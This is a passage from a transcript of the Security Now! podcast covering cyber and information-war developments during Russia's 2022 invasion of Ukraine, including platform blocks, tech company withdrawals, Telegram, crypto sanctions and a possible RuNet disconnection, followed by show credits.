And interestingly, Elon had apparently been having trouble obtaining a license until now to activate Starlink in Ukraine.  One can imagine the political pushback from the existing carriers who were in no hurry to increase their competition from above.  But no one batted an eye when Elon said:  "Give me permission to turn it on, and I will."  They did; he did.  And afterwards a Ukrainian engineer, Oleg Kutkov, said in an interview with The Verge that his Starlink dish got a signal from one of SpaceX's satellites in just 10 seconds.  He told The Verge:  "I honestly didn't believe it would work."



So it certainly is the case that satellites are going to be, unless you shoot them out of orbit, are going to be impossible to cut off.  Well, I guess you could jam the signal, except they can also be targeted.  So that is, you know, line of sight connections to the dish.  So it might be the jamming is also much more difficult to do.



On their side, Russia has blocked access to Facebook, Twitter, and foreign news outlets.  This would be the "two can play that game" line.  They blocked access to Facebook after Meta deactivated or restricted access to accounts belonging to pro-Kremlin media outlets and news agencies, including that RIA -  the main Russia media outlet - Novosti, also Sputnik and Russia Today.  And our favorite Russian agency, Roskomnadzor, told Interfax that Russia has now also blocked access to Twitter following a demand made by the Prosecutor General's Office.  I had read that that happened last Friday.



On Thursday, Roskomnadzor asked Meta to immediately lift all restrictions on Russian media outlets, that is, the members of the RT Media Group.  Roskomnadzor said Friday that the decision was motivated, that is, their decision to disconnect, by Facebook discriminating against Russian media and information resources starting in October of 2020, so quite some time ago.  Roskomnadzor stated:  "On March 4, a decision was made to block access to the Facebook network within the Russian Federation."  Although notably some other properties, Instagram and WhatsApp, have as far as I know still not yet been blocked, only Facebook.



And also last Friday, Roskomnadzor blocked access to multiple foreign news outlets, some of them designated as foreign agents, including Voice of America, the BBC, DW, and Radio Free Europe and Radio Liberty.  Not that they had to, but Russia justified the media outlets' ban saying that they spread fake news regarding the ongoing invasion of Ukraine, the methods used by its military against Ukrainian citizens and infrastructure, and the number of casualties suffered by the Russian army.  We in the West have seen a great deal of coverage, and I'm unsurprised that Russia would not want all Russians to see what we see here going on.



Google was also asked on Thursday to stop advertising campaigns spreading what Roskomnadzor called "misinformation" on YouTube videos about the Russian invasion of Ukraine.  Roskomnadzor said that online ads with no age labels and inaccurate content are being used to instill "protest moods" and spread false info on the Russian "special operation," as they're calling it, in Ukraine.



And YouTube has become quite important.  As I was putting this together, I hadn't get gotten to a chart that I saw indicating that it is the number one social media outlet used in Russia.  It's, like, way above everything else.  So Roskomnadzor sent a letter to Google LLC demanding that Google immediately stop disseminating false information of a political nature about the special operation of the Russian Armed Forces in Ukraine on the territory of Russia.  Well, of course, that's rich.



Roskomnadzor's demand continued, saying:  "Such advertising messages are shown to the Russian users of the video hosting site YouTube and contain misinformation aimed at forming a distorted perception of the events taking place and creating protest sentiments among the Russian Internet audience.  The agency considers it unacceptable to use YouTube in the information war against Russia, including using the advertising capabilities of the platform."  And I'll just give everybody a hint.  This is all building towards a conclusion that we'll be getting to here at the end of the podcast.  Which is, you know, ultimately what Russia's probably going to have to do.



Roskomnadzor also notified all independent Russia media outlets not to spread false information, that is, the media outlets inside Russia that are independent, not to spread false information about the shelling of Ukrainian cities, as well calling the "ongoing operation" an attack, invasion, or a declaration of war.  And I'm sure everyone has probably heard by now, Russia is also planning to introduce a new law that would punish the spreading of what they consider to be fake news about the Russian armed forces' military operations in Ukraine with up to 15 years in prison.



For their part, Google has already taken action to stop actual misinformation, taking down disinformation campaigns regarding Russia's invasion, and blocked YouTube channels belonging to Russia Today and Sputnik across Europe at the request of European Union authorities.  Roskomnadzor protested YouTube's decision, as we said, demanding the immediate removal of all access restrictions to the official accounts of Russian media, including RT and Sputnik, in Europe.



Previously, Google demonized Russian state-funded media across all its platforms - I don't mean demonized, I'm sorry, demonetized.  Google demonetized Russian state-funded media across all its platforms to block Russian state-funded media  from running ad campaigns.  And YouTube has removed hundreds of channels with thousands of videos which violate its Community Guidelines, including channels engaging in "coordinated deceptive practices," as Google labeled them.



Google said:  "When people around the world search for topics related to the war in Ukraine on Search or YouTube, our systems prominently surface information, videos, and other key context from authoritative news sources."  So for the time being, Google said that most of its services, including Search, YouTube, and Maps, remain available in Russia to provide Russians with access to global information and perspective.



So overall the situation appears to be developing as we would have expected it to.  The providers of the content hold the cards.  They, and they alone, are able to decide which content their platforms serve up and which they block and delete.  The only power a local authoritarian government has is to choose to block everything from a provider.



Also, Google has been even more proactive on the security front.  They announced last Tuesday that they were focusing upon increasing security measures to help protect Ukrainian civilians and websites, which other U.S. technology providers, like Meta, you know, Facebook, had also been doing.  Meta has been actively working to disrupt the flow of disinformation in the region and take down accounts that targeted Ukrainian officials with phishing attempts.



But as for Google, in a statement by Kent Walker, their President of Global Affairs, Google said the measures include SOS alerts on its Search function, automated detection and blocking of suspicious activity, Gmail notifications of government-backed attack warnings, increased authentication challenges, and the expansion of its Advanced Protection and Project Shield programs.  In other words, rapid and strengthening of Google's authentication.



As for Search and Maps functions, the company has disabled various live Google Maps features within Ukraine, such as traffic information, to prevent public access to population densities within different areas.  The company also issued SOS alerts that will guide users to United Nations resources for refugees and asylum seekers when they search for refugee and evacuation instructions.  So they've been more carefully curating their search engine results during all of this.  And they've reportedly expanded security protections after its Threat Analysis Group - remember the TAG team, T-A-G - reported an increased focus from threat actors on Ukrainian targets.  They've blocked attempted attacks "without any compromise," they said, "of Google accounts as a result of the campaign."



They increased the frequency of authentication challenges for Ukrainian civilians and are relying on their Advanced Protection Program to safeguard hundreds of high-risk accounts in the region.  A campaign known as Project Shield is also being used to help protect over 100 websites belonging to news publications, human rights groups, political organizations, and other groups that are targeted by distributed denial-of-service attacks.  So they're also stepping up and strengthening the sites that they're responsible for against DDoS.



And following the statement issued by Google last Tuesday, Apple announced, as we've probably heard, that they had ceased all sales of their technology in Russian online stores after Ukraine's Prime Minister pleaded with them to shut down the app store and halt all Russian sales, which they've done.  Microsoft also recently, I think it was on Friday, said that they are suspending all of the sales and support inside Russia's borders.



A domain registrar, Namecheap, that I've heard of in passing, eight days ago they - they're Phoenix-based, you know, Phoenix, Arizona-based, founded 22 years ago, so they've been around for a while, in the year 2000, now operating in 18 countries with 1,700 employees and managing 14 million domains.  They sent an email that I guess I feel of mixed mind about.  This went out eight days ago to all of their registrants, their customers, their domain name customers, located in Russia.



They said:  "Unfortunately, due to the Russian regime's war crimes and human rights violations in Ukraine, we will no longer be providing services to users registered in Russia.  While we sympathize that this war may not affect your" - may not affect, that's what they said - "affect your own views or opinion on the matter, the fact is your authoritarian government is committing human rights abuses and engaging in war crimes.  So this is a policy decision we have made and will stand by.  If you hold any top-level domains with us, we ask that you transfer them to another provider by March 6" - two days ago - "2022."  Okay, so that was a seven-day, a one-week notice of unilateral service cancellation.



Their note continues briefly:  "Additionally, and with immediate effect, you will no longer be able to use Namecheap Hosting, EasyWP, and Private Email with a domain provided by another registrar in Russian top-level domains.  All websites will resolve to 403 Forbidden.  However, you can contact us to assist you with your transfer to another provider."



And predictably, this email generated some angry pushback from Russians, to which Namecheap's CEO replied over on Ycombinator.  He said:  "We haven't blocked the domains.  We are asking people to move.  There are plenty of other choices out there when it comes to infrastructure services, so this isn't deplatforming.  I sympathize with people who are not pro-regime, but ultimately even those tax dollars they may generate go to the regime.  We have people on the ground in Ukraine being bombarded now nonstop."  He says:  "I cannot with good conscience continue to support the Russian regime in any way, shape or form.  People that are getting angry need to point that at the cause, their own government.  If more grace time is necessary for some to move, we will provide it.  Free speech is one thing, but this decision is more about a government that is committing war crimes against innocent people that we want nothing to do with."



Now, I'll just note that expecting anyone in Russia to successfully move their domain at this moment with banks closed, Visa, MasterCard, and PayPal all having suspended service, and the value of the Russian ruble having collapsed, is totally infeasible.  So in practice this really doesn't represent, I mean, it does represent effective abandonment.



And as I said, I feel a little queasy about that.  It seems to me that individual Russian citizens, small businesses, charitable organizations, et cetera, ought to have the West standing with them to help them survive this period, rather than abandoning them in their time of what could be great need.  All indications are that Russian citizenry is quite divided in their feelings about the actions of their own regime, to the degree that they know what's going on.  You know, being politically aware in the U.S., we certainly understand the nature of division.  There are many topics of discussion which are now off limits between my own much beloved family members.  So we, too, are a divided nation.



But when Namecheap took their Russian customers' money, they didn't ask about their political sentiments.  They took their money in return for a promise to provide service for some period of time.  Commitments are not subject to reconsideration.  That's what makes them a commitment.  I would have no problem if Namecheap were to announce that they would be suspending the renewal of domains at their expiration, so giving their Russian customers fair notice of the need to find another service at that time.  I don't see Namecheap offering to refund their customers' money in U.S. dollars, which are now quite valuable at the current dollars-to-rubles exchange rate.  But even doing that would still have left those customers stranded.  So I don't know.  To me, that seems like a hard-to-defend breach of commitment.



Two days after that, they posted:  "Effective immediately, we will begin offering free anonymous hosting and domain name registration to any anti-Putin, anti-regime, and protest websites for anyone located within Russia and Belarus.  Please contact our support for details."  And since this announcement followed two days after their Russia abandonment email, doing a little reading between the lines, I wouldn't be surprised if this was their way of selectively backpedaling and arranging to continue offering some services and hosting, but only to those entities whose politics they're aligned with.  So anyway, even DNS providers are getting in on all of this.



LEO:  And now Steve will talk about Telegram.



STEVE:  So we've talked about Telegram, you and I, Leo, for the past nine years, ever since it first appeared in 2013.  And as our listeners know, despite its popularity, I've always looked askance at it since for reasons I will never understand, its authors unnecessarily violated the cardinal rule of cryptography.  They rolled their own, unlike the many other properly designed alternatives such as Signal and Threema, just to name two.  And offering a bounty for someone who cracks their crypto is not the same as designing it properly.  For all we know, it has been cracked by someone like the NSA.  And the knowledge they have and the access this provides is worth far more to them than Telegram's bounty.  They would want things to remain just the way they are, with Telegram being unexamined, apparently unbroken, but certainly not fixed.



So in any event, I mean, it is - I remember when I first rolled up my sleeves and looked at it, it was just the screwiest random pile of crypto primitives anyone had ever seen.  And it's been described the same way, not just by me, but by other crypto experts who are like, what?  But anyway.  As far as this goes, no one could care less what I think.  Telegram is super popular, and its popularity has recently exploded during this horrific Russia-Ukraine mess.



As we've followed Roskomnadzor's and the Russian Federal Security Service's (the FSB's) ultimately futile efforts through the years to shut down and block Telegram, we saw them finally give up a couple years ago.  They just, you know, Telegram just kept dodging and weaving and refused to be taken offline, and they've survived.  The risk intelligence company, Flashpoint, noted in a recent report that six out of 10 Russians use Telegram precisely because their country's authorities are unable to impose any oversight on the platform.



So it should also be no surprise that Telegram's messaging has taken a pivotal role in the ongoing conflict between Russia and Ukraine and is being widely used by both hacktivists and cybercriminals.  According to a report from Checkpoint, the number of Telegram groups has increased six-fold since February 24th.  And some of them, dedicated to certain topics, have exploded in size, in some cases counting more than a quarter million members.



Three categories which have rapidly gained in popularity as a direct result of the Russian invasion of Ukraine are, first, volunteer hackers engaging in DDoS and other kinds of cyberattacks against Russian entities.  Second, fundraising groups - whoops - that accept cryptocurrency donations, allegedly for Ukrainian support.  And, third, various "news feeds," and you've got to put that in air quotes, too, because just citizens aiming their smartphone somewhere that promise to offer reliable reports from the frontline.



We've already talked about the group that stands out among those that lead the anti-Russia cyberwarfare operations, the so-called IT Army of Ukraine, whose membership is now at, okay, and remember at the beginning of the podcast I said 175,000?  I got an updated number.  We're now at 269,972.



LEO:  Wow.  Wow.



STEVE:  So just shy of 270,000 subscribers are like members of this IT Army of Ukraine.  I would not want to have all those people, like, you know, empowered to do what dastardly thing they can.  That would be daunting.  In addition to targeting, orchestrating, and launching DDoS attacks against key Russian sites, the group exposes the personal details of opinion-makers in Russia and other people who play a significant role in the conflict.  So, yeah, again, I wouldn't want that aimed at me.  As for the "fund-raising groups," that's in air quotes because, naturally and unfortunately, the majority of the self-declared "donation support" groups in Telegram are scams, as they're going to be, that take advantage of sentiments to relieve people of their money.



And then there's the "news," also in air quotes.  Checkpoint's coverage of Telegram notes, they said:  "In the era of social media, traditional news channels are merely a sideshow for numerous newsfeed Telegram groups.  These groups on Telegram report unedited, non-censored feeds from war zones 24 hours a day, including footage that traditional mainstream media often refrained from airing live."  I can imagine.  "In fact," they said, "about 71% of the groups we see are dedicated to news around the current conflict."  So just shy of three quarters of Telegram groups are about providing news.



"Checkpoint researchers," they said, "observed such groups appearing rapidly from the beginning of the conflict and have continued to grow since then.  In such groups, the quality of newsfeeds is not a factor, and users often leverage this to spread 'news' and 'facts' that are not verified or checked.  This is a form of psychological weapon, used to demoralize and influence morale.



"So the bottom line is to be skeptical, use your own judgment, and guard against becoming seduced by anyone's narrative that seems too good to be true.  It may indeed be too good to be true."  Or, you know, too horrific to be true.  And in fact Michael Horowitz, a geopolitical and security analyst who's the head of intelligence for the firm Le Beck International, recently tweeted.  He said:  "I have deleted footage of a plane being shot down above Kharkiv as it seems to be from a video game."  He said:  "That's a very realistic one.  Sorry for the mistake."  So, yeah, be careful what you think of as real.



As I mentioned before, Microsoft has also shut down in Russia.  There were some interesting tidbits in what their Chairman and President Brad Smith posted under the title "Microsoft suspends new sales in Russia."  He said:  "Like the rest of the world, we are horrified, angered, and saddened by the images and news coming from the war in Ukraine and condemn this unjustified, unprovoked, and unlawful invasion by Russia.  I want to use this blog" - I'm just going to share the top of it -  "to provide an update on Microsoft's actions, building on the blog we shared earlier this week."



He said:  "We are announcing today that we will suspend all new sales of Microsoft products and services in Russia.  In addition, we are coordinating closely and working in lockstep with the governments of the United States, the European Union, and the United Kingdom.  And we're stopping many aspects of our business in Russia in compliance with governmental sanctions decisions.  We believe we are most effective in aiding Ukraine when we take concrete steps in coordination with the decisions being made by these governments, and we will take additional steps as this situation continues to evolve.



"Our single most impactful area of work almost certainly is the protection of Ukraine's cybersecurity.  We continue to work proactively to help cybersecurity officials in Ukraine defend against Russian attacks, including most recently a cyberattack against a major Ukrainian broadcaster.  Since the war began, we have acted against Russian positioning, destructive or disruptive measures against more than 20 Ukrainian government, IT, and financial sector organizations.  We've also acted against cyberattacks targeting several additional civilian sites.  We have publicly raised our concerns that these attacks against civilians violate the Geneva Convention."  So Microsoft, too, in addition to a growing list.  And actually I have a brief list in a minute.



Coinbase.  Last Sunday the 6th, Paul Grewal, the Chief Legal Officer for Coinbase, announced the employment of crypto tech to promote sanctions compliance.  They announced that they are actively blocking access to more than 25,000 blockchain addresses  in other words, wallets  linked to Russian individuals and entities.  And Coinbase shared all of the blocked addresses with the U.S. government in order to further support sanctions enforcement.  So they used their blockchain analytics in order to say here's the people; here's the wallets that we've seen them link to.



Coinbase will also be blocking sanctioned entities from opening new accounts and actively detecting attempts to evade the ban.  The ban addresses sanction lists maintained by countries worldwide, including the United States, United Kingdom, European Union, United Nations, Singapore, Canada, and Japan.



Citing an example, Paul wrote:  "For example, when the United States sanctioned a Russian national in 2020, it specifically listed three associated blockchain addresses.  Through advanced blockchain analysis, we proactively identified over 1,200 additional addresses potentially associated with the sanctioned individual."  Okay, now, I'll just stop and say, wait a minute.  What do you want to bet that's a ransomware entity?  Because they're saying it sounds like the U.S. had three blockchain addresses.  These guys dug in and found everything that those three were connected to.



The fact that it exploded into 1,200 additional addresses, that sure feels to me like somebody who was doing a lot of monetary movement through various chains.  Anyway, "1,200 additional addresses potentially associated with a sanctioned individual, which we added to our internal block list.  Today, Coinbase blocks over 25,000 addresses related to Russian individuals or entities we believe to be engaged in illicit activity, many of which," he said, "we have identified through our own proactive investigations."



Now, two weeks ago, on the 27th of February, our friend in Ukraine, Mykhailo Fedorov, asked for more than the crypto exchanges were willing to do.  He tweeted:  "I'm asking all major crypto exchanges to block addresses of Russian users.  It's crucial," he tweeted, "to freeze not only the addresses linked to Russian and Belarusian politicians, but also to sabotage ordinary users."



But Coinbase and the other crypto exchanges, including Binance, refused to freeze all Russian users' accounts.  Their various spokespeople added that, while they will not block all Russian accounts on their platforms, the crypto exchanges will take steps to identify all sanctioned entities and individuals and block those accounts and transactions.  Coinbase cited the "economic freedom in the world."  And Binance said it was about the "greater financial freedom for people across the globe."  And banning users' access to their cryptocurrency, Binance said, "would fly in the face of the reason why crypto exists in the  first place."  So cryptocurrencies are also involved.



Now, naturally, Russia has not been doing nothing.  Last Thursday, amid the continually escalating Russian attack on Ukraine, Russia's NCCCI, their National Coordination Center for Computer Incidents, published a list, presumably intended to be used by those sympathetic to President Putin's expansionist agenda for retaliation against these claimed attacks on Russian cyber infrastructure.  And I say "claimed attacks" because, in addition to the massive list containing 17,576 individual IP addresses were 166 domains that the NCCCI said were behind a series of DDoS attacks aimed at its domestic infrastructure.



So in other words, Russia is saying we want anybody who is pro-Russia to go on the cyber offensive and attack all these.  Among the domains were the U.S. Federal Bureau of Investigation, the Central Intelligence Agency, and websites of several media publications including USA Today and Ukraine's Korrespondent magazine.  So it appears that not liking someone is enough to get them on the list.  I doubt that USA Today was DDoSing Russia.



But anyway, not surprisingly, the NCCCI is reacting to the gradual and incremental, but also probably inevitable withdrawal of Western and non-Russian cyber services from Russia.  As part of its recommendations to counter the DDoS attacks, the agency is urging organizations to "ringfence" network devices, whatever that is; enable logging and changing passwords; enforce data backups; and be extra alert for phishing attacks.  In other words, the standard things you would do to better raise and defend yourself against cyberattack.  But the coolest advice from NCCCI caught me a bit by surprise at first.  But then I thought it was really interesting and obvious in retrospect.  The NCCCI advised its citizenry and Russian enterprises to turn off automatic software updates and disable third-party plugins on websites.



Now, at this point Microsoft has pulled the plug on Russian revenue, but the U.S. is not at war with Russia.  And of course we're being very careful not to be at war with Russia.  However,  wow.  Consider the implications of Microsoft's - and I'm not suggesting this has ever happened or ever would - but the implications of Microsoft's deliberate sabotage of Windows security in aid of a war effort against Russia. I would not want to be on their side, on the other side of that.



And I have to say this puts a spin I had never considered on my rooting for having all of our devices phoning home and auto-updating all the time.  You know, we don't want to go to war with China, either.  We could easily be on the receiving end with all of the IoT gadgets that most of us are now using.  This is all quite sobering.  It's one thing to have an inadvertent security mistake be patched. It's another thing to have a deliberate attack launched as a consequence of auto update, which has just loaded a bunch of stuff there, who knows, into one's computer.  And I know I was slow to buy into this whole cyberwar idea.  So I suspect I'm still probably being a little naive.



The NCCCI also advised its citizenry to "Use Russian DNS servers.  Use the corporate DNS servers and/or the DNS servers of your telecom operator," they said, "in order to prevent the organization's users from being redirected to malicious resources or other malicious activity."  In other words, they're battening down the hatches.  They said:  "If your organization's DNS zone is serviced by a foreign telecom operator, transfer it to the information space of the Russian Federation."



And there again, Russian devices are necessarily trusting the certificates issued by Western certificate authorities, since the websites and services that Russians depend upon are serving Western certificates.  Just think for a minute how much implicit cross-border trust there is in today's globally interconnected world.  This has been the background thought I've had all throughout this mounting aggression.  It's really no longer in any way practical for any single country to completely isolate itself from the rest of the world.  There's just too much true interdependence, and there is implicit trust that comes with that interdependence.



And speaking of interdependence, according to the global Internet access watchdog NetBlocks, Russia has placed extensive restrictions on Facebook access within the country.  We talked about that before.  And late last week there were reports that Twitter had also become unavailable.  Again, Twitter wasn't doing what Roskomnadzor had asked, so no Twitter for you, Russians.  Ukraine has also updated its list of targets for its volunteer IT Army of civilian hackers.  Now on the list are the Belarusian railway network, Russia's homegrown satellite-based global navigation system GLONASS, and telecom operators MTS and Beeline.



And in another shoe dropping, Russia authorities are drafting a set of measures to support the country's economy against the pressure of foreign sanctions, which they're certainly feeling.  And as part of this, the proposal, which is in the process of being finalized, would eliminate intellectual property right limitations in order to explicitly permit piracy within Russia.



The plan is to establish a unilateral software licensing mechanism that would renew expired licenses - and this is all euphemisms - without requiring the consent of the copyright or patent owner.  This new process will be available in cases where the copyright holder is from a country that has supported sanctions against Russia for products without Russian alternatives, which of course are many, if not most.  The move is Russia's response to numerous software vendors exiting the Russian market and suspending new license sales, including Microsoft, Cisco, Oracle, NVIDIA, IBM, Intel, and AMD.  In other words, okay, you don't have to honor those licenses any longer, says Russia.



The original Article 1360 of the Civil Code of the Russian Federation says that, in the original one:  "In the interests of national security, the government of the Russian Federation shall have the right to permit the use of an invention, utility model, or industrial design without the consent of the patent holder provided that he is notified as soon as possible and payment to him a reasonable remuneration."  Now, however, in multiple proposed amendments to this Russian Civil Code, the Russian Ministry of Digital Transformation wants to bypass compensation to license holders who are under sanction restrictions so that they can continue using the software.



Translated proposed amendments read:  "Amending Article 1360 of the Civil Code of the Russian Federation regarding the use of a license and other types of rights and the abolition of compensation to foreign companies originating from states that have acceded to the sanctions Federal Law."  Now, of course, software products that rely on cloud services or online verification, as so many do now, will stop working since no unilateral change in Russia's international intellectual property treaties will keep online services from being shut down.  But this does feel as though Russia will be entering a bit of a dark age, depending upon how long this goes on.  Who would want to sell to a rogue nation, even if sanctions were not in place?



And so this brings us to the big question.  Will Russia disconnect?  Are we about to see Russia flip the switch?  It feels like we are.  Although Roskomnadzor has been working overtime to censor information by blocking its citizens' access to Western media, services such as Telegram have withstood all previous blocking attempts.  And YouTube, as I said, remains the number one most popular service in all of Russia.  Google is refusing to comply with Roskomnadzor's censorship attempts and demands, while simultaneously blocking Russia's own state-sponsored propaganda from being carried by YouTube.  So it may be that nothing short of disconnecting all of Russia from the rest of the Internet will be the only solution that they believe is workable.  And given the things we've seen, these comments about using your local Russian-based DNS, and if your DNS is coming from outside of Russia switch to inside, this all feels like a preamble.  



We've previously talked about the RuNet, Russia's sovereign Internet, which has been in development, we've been talking about it as it's come up from time to time for years, and remember was successfully tested for actual deployment with the collaboration of their largest Internet providers in Russia last summer.  It worked.  Remember when we discussed the need for and their establishment of an entirely autonomous DNS system.  In other words, they needed to replace the global root servers in order for their system to continue working as DNS caches expired.



Well, this past Sunday afternoon, two days ago, a letter allegedly leaked from the Deputy Minister of Digital Marketing and Mass Communications of the Russian Federation was posted by Anonymous on Twitter.  Since it's written in Russian, of course, I cannot read what it says.  But Anonymous claims that it provides instructions to all organizations about how to prepare for connection to the RuNet and disconnection from the Internet.  Anonymous's tweet says:  "Russia is preparing to disconnect from the global Internet, limiting access to information for the Russian people.  That means censorship, and we [Anonymous] are totally against censorship of any kind.  So let's turn up the pressure!"  And then in the show notes I have a link to their tweet which does show a picture of this two-page document written in Russian.



It would seem to me that I don't know what "turning up the pressure" means, but it would only hasten the pulling of the plug.  Russia doesn't have, and must import, Western technology.  They cannot duplicate our semiconductors.  But unfortunately they may have reason to count on China as a strategic partner.  China really is the wildcard in much of this.  But China is not the West and cannot replace much of what only Europe, the U.S., the U.K., and others provide.  So we are living in interesting times, and we might be on the precipice of having Russia disconnect itself from the Internet in order to once and for all isolate its citizens from what's going on.  Wow.



LEO:  And there you have it, Security Now! for another exciting week, thrilling, gripping edition.  Steve is available at GRC.com.  That's where you'll find his SpinRite, world's best mass storage maintenance and recovery utility.  Currently 6.0; 6.1 is coming.  You can buy 6.0 now, get 6.1 for free when it's available and participate in its development.  That's at GRC.com.



While you're there you can pick up a copy of the show.  He has two unique formats, the 16Kb audio for the bandwidth impaired.  I always, for some reason I imagine somebody in the Australian Outback who's on some sort of weird satellite connection.



STEVE:  Well, of course it started with Elaine; right?



LEO:  She didn't want a big audio file, yeah.



STEVE:  She was satellite because she's out in the boonies somewhere.



LEO:  Right, right.



STEVE:  And she said, this is a big file, Steve.  I said, oh, I'll fix that.



LEO:  So she takes it, she transcribes it, and that's the other unique format, the human-written transcriptions from Elaine Farris, which makes it a great, you know, read along while you listen or search for a part of the show.  Or just, you know, have a text version of Security Now!, including all the ums and uhs and pauses.  GRC.com.  We have everything at our website, too, TWiT.tv/sn.  There's audio there.  There's video there.  You could subscribe in your favorite podcast client.  There's an audio stream, a dedicated video channel, I should say, at YouTube.  Lots of ways to consume it.



In fact, you can even watch us do it live, which we do every Tuesday at about 1:30 Pacific, 4:30 Eastern, 21:30 UTC at live.twit.tv.  There's audio and video streams there.  You can chat with us at irc.twit.tv.  Club TWiT members can chat inside the Discord.  There's always something going on in that Discord, including some really cool, unique shows like our untitled Linux show.  I guess that's it.  That's all the business.  Thank you, Steve.  Great job.  See you next week.



STEVE:  Well, that's the news from there.  Hopefully nothing catastrophic will happen in cyber world.  If it does, we'll talk about it next week.  But there were other things to talk about which we'll get to next week for sure.



LEO:  Yes.  Thank you, Steve.  We'll see you all next time on Security Now!.



STEVE:  Bye-bye.



Copyright (c) 2022 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




